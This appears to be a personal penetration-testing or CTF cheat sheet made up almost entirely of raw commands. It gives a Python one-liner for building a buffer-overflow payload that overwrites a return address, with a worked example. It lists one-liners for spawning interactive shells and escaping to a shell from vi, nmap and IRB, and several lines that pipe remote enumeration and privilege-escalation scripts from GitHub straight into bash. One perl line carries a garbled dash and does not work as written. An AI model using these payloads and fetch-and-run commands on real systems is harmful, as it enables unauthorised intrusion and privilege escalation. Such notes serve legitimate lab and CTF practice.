Create payload bufferoverflow 

python -c 'import struct,sys;sys.stdout.write("X"*{offset bytes}+struct.pack("<L",{address to execute}))'

Example:
offset 32 characters 
funcion to execute 0x08048a37
python -c 'import struct,sys;sys.stdout.write("X"*32+struct.pack("<L",0x08048a37))'
#########################
########################

Spawning a TTY Shell

python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i

perl â€”e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

(From within IRB)
exec "/bin/sh"

(From within vi)
:!bash

(From within vi)
:set shell=/bin/bash:shell

(From within nmap)
!sh
##################
#################

Enumeration script

bash <(curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l1 -i
bash <(curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l2 -i
##################
###################

Escalation check

bash <(curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

bash <(curl -s https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh)
################
###############
